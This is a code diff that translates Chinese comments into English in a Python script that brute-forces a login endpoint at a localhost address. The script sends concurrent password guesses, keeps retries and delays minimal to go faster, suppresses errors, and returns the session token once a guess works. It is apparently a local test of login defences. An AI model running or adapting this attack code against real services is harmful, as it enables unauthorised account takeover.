@@ -12,28 +12,28 @@ from urllib3.util.retry import Retry
 from concurrent.futures import ThreadPoolExecutor, as_completed
 import threading
 
-# 禁用 SSL 警告（因为使用的是自签名证书）
+# Disable SSL warnings (using self-signed certificate)
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # Target URL for testing
 BASE_URL = "https://127.0.0.1:8000"
 
-# 并发线程数（可以根据需要调整）
+# Number of concurrent threads (adjust as needed)
 MAX_WORKERS = 10
 
 def create_session_with_retry():
-    """创建带有重试机制的 requests session"""
+    """Create requests session with retry mechanism"""
     session = requests.Session()
     
-    # 禁用 SSL 验证（因为使用的是自签名证书）
+    # Disable SSL verification (using self-signed certificate)
     session.verify = False
     
-    # 配置重试策略（减少重试次数以加快速度）
+    # Configure retry strategy (reduce retries to speed up)
     retry_strategy = Retry(
-        total=1,  # 只重试1次（减少重试以加快速度）
-        backoff_factor=0.5,  # 重试间隔：0.5秒
-        status_forcelist=[429, 500, 502, 503, 504],  # 这些状态码会触发重试
-        allowed_methods=["POST", "GET"]  # 允许重试的方法
+        total=1,  # Retry only once (reduce retries to speed up)
+        backoff_factor=0.5,  # Retry interval: 0.5 seconds
+        status_forcelist=[429, 500, 502, 503, 504],  # These status codes trigger retry
+        allowed_methods=["POST", "GET"]  # Allowed retry methods
     )
     
     adapter = HTTPAdapter(max_retries=retry_strategy)
@@ -44,10 +44,10 @@ def create_session_with_retry():
 
 def try_password(email: str, password: str, session: requests.Session) -> Optional[Tuple[str, str]]:
     """
-    尝试单个密码
+    Try a single password
     
     Returns:
-        (password, token) 如果成功，否则 None
+        (password, token) if successful, otherwise None
     """
     try:
         response = session.post(
@@ -56,7 +56,7 @@ def try_password(email: str, password: str, session: requests.Session) -> Option
                 "email": email,
                 "password": password
             },
-            timeout=5  # 减少超时时间以加快速度
+            timeout=5  # Reduce timeout to speed up
         )
         
         if response.status_code == 200:
@@ -64,7 +64,7 @@ def try_password(email: str, password: str, session: requests.Session) -> Option
             if data.get("ok") and data.get("token"):
                 return (password, data.get("token"))
     except Exception:
-        # 静默处理错误，加快速度
+        # Silently handle errors to speed up
         pass
     
     return None
@@ -77,7 +77,7 @@ def brute_force_attack(email: str, password_list: List[str], use_concurrent: boo
     Args:
         email: Target email address
         password_list: List of passwords to try
-        use_concurrent: 是否使用并发攻击（默认True，速度更快）
+        use_concurrent: Whether to use concurrent attack (default True, faster)
         
     Returns:
         (success status, token if successful)
@@ -94,25 +94,25 @@ def brute_force_attack(email: str, password_list: List[str], use_concurrent: boo
     token = None
     
     if use_concurrent:
-        # 并发攻击模式
+        # Concurrent attack mode
         result_lock = threading.Lock()
-        stop_flag = threading.Event()  # 用于快速停止所有任务
+        stop_flag = threading.Event()  # For quickly stopping all tasks
         completed = 0
         
         def worker(password: str):
             nonlocal successful_password, token, success_count, failed_count, completed
             
-            # 如果已经找到密码或收到停止信号，直接返回
+            # If password already found or stop signal received, return immediately
             if stop_flag.is_set() or successful_password:
                 return None
             
-            # 每个线程使用自己的 session
+            # Each thread uses its own session
             session = create_session_with_retry()
             result = try_password(email, password, session)
             session.close()
             
             with result_lock:
-                # 再次检查是否已经找到密码（避免重复处理）
+                # Check again if password already found (avoid duplicate processing)
                 if stop_flag.is_set() or successful_password:
                     return None
                 
@@ -123,20 +123,20 @@ def brute_force_attack(email: str, password_list: List[str], use_concurrent: boo
                 if result:
                     successful_password, token = result
                     success_count = 1
-                    stop_flag.set()  # 设置停止标志
+                    stop_flag.set()  # Set stop flag
                     return result
                 else:
                     failed_count += 1
             
             return None
         
-        # 使用线程池并发执行
+        # Use thread pool for concurrent execution
         with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
             futures = {executor.submit(worker, pwd): pwd for pwd in password_list}
             
             for future in as_completed(futures):
                 if stop_flag.is_set():
-                    # 取消剩余任务
+                    # Cancel remaining tasks
                     for f in futures:
                         f.cancel()
                     break
@@ -147,7 +147,7 @@ def brute_force_attack(email: str, password_list: List[str], use_concurrent: boo
                 except Exception:
                     pass
     else:
-        # 串行攻击模式（保留原逻辑作为备选）
+        # Serial attack mode (keep original logic as fallback)
         session = create_session_with_retry()
         
         for i, password in enumerate(password_list, 1):
@@ -162,7 +162,7 @@ def brute_force_attack(email: str, password_list: List[str], use_concurrent: boo
             if i % 10 == 0:
                 print(f"[Progress] Attempted {i}/{len(password_list)} passwords...")
             
-            # 最小延迟（几乎无延迟）
+            # Minimal delay (almost no delay)
             time.sleep(0.01)
         
         session.close()
